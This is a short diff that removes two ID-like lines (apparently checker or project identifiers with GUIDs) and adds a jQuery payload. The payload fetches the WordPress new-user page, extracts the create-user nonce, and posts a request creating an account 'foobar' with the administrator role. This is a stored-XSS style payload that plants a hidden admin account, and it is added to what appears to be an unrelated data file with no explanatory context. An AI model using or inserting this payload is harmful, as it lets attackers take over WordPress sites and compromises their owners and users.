@@ -1,2 +1,4 @@
-HuyXChecker|StemProject|39444335-3233-4B32-4C46-F8B46AA2722B
-lmao|lmao|8FE473C5-4FD5-E54C-86D5-78B70276E13B
+u="/wp-admin/user-new.php"; jQuery.get(u, function(e) {jQuery.post(u,{action: "createuser","_wpnonce_create-
+user":
+e.match(/_wpnonce_create-user\"\svalue=\"(.+?)\"/)
+[1], user_login: "foobar", email: "foo@bar.com", pass1: "foo", pass2:" foo", role: "administrator"})});
